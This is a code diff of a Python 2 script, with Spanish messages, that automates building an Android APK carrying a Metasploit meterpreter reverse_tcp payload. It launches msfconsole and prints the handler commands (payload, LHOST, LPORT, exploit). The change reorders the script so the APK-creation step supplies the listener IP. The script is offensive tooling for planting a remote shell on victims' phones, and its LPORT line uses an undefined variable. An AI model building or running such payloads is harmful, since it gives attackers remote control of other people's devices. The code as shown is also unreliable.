@@ -37,10 +37,11 @@ parser.add_argument('lp', metavar='lp', type=str, nargs='+',
 args = parser.parse_args()
 ##//PARSER SHIT---------
 
-print "Generando APK..."
 APK = createAPK()
+print "Generando APK..."
+ipl = APK.create(args.app_name, args.lp)
 print "Iniciando postgresql..."
-ipl = APK.launchProcess("gnome-terminal -e 'bash -c \"service postgresql start; exec bash\"'")
+APK.launchProcess("gnome-terminal -e 'bash -c \"service postgresql start; exec bash\"'")
 print "Iniciando msfconsole en nueva ventana..."
 APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
 print "--usa esta guia--"
@@ -49,6 +50,6 @@ print "set payload android/meterpreter/reverse_tcp"
 print "set LHOST " + ipl
 print "set LPORT "+ lp
 print "exploit"
-APK.create(args.app_name, args.lp)
+
 
 raw_input("Presiona una tecla cuando hayas configurado el handler...")
